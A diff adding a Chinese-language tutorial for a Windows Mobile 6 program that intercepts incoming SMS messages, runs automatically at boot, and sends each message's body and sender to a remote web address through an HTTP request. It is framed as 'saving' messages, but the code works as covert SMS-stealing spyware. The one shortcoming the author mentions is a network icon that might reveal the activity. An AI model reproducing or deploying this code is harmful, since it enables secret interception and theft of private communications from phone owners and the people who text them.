@@ -1,0 +1,36 @@
+开发环境 vs2008 wm6 .net cf 3.5
+
+
+1、读取系统的新短信
+2、把短信内容保存下来
+3、程序开机后自动运行。
+
+
+
+
+具体实现代码
+1.订阅MessageReceived事件，收到短信后执行RevMsg_MessageReceived方法处理短信
+        private MessageInterceptor RevMsg;
+        private void MessageService()
+        {
+            RevMsg = new MessageInterceptor();
+            RevMsg.MessageReceived += new MessageInterceptorEventHandler(RevMsg_MessageReceived);
+        }
+2.短信处理方法
+可以把短信内容保存到指定链接，也可以保存到手机txt文件中
+                HttpWebRequest request = (HttpWebRequest)WebRequest.Create("http://www.xxxxxxxxx.com/xxxx?nr=" + msg.Body.ToString() + "&ld=" + msg.From.ToString());
+                HttpWebResponse response = (HttpWebResponse)request.GetResponse();
+                Stream stream = response.GetResponseStream();
+                string WebContent = new StreamReader(stream, System.Text.Encoding.Default).ReadToEnd();
+                stream.Close();
+                response.Close();
+3.实现开机自动运行功能
+打包cab文件时，只需把快捷方式添加到Startup文件夹下面就ok。
+
+
+不足之处：把短信内容保存到web时，会开启手机的 edge功能，手机上面有个联网的E通知图标，2分钟后才会关闭，没找到能快速关闭EDGE网络图标的方法。
+
+
+如果你发现有什么不合理的，需要改进的地方，邮件联系328452421@qq.com（qq常年不在线，邮件联系） 相互交流 谢谢
+下载地址 
+http://download.csdn.net/source/3513130
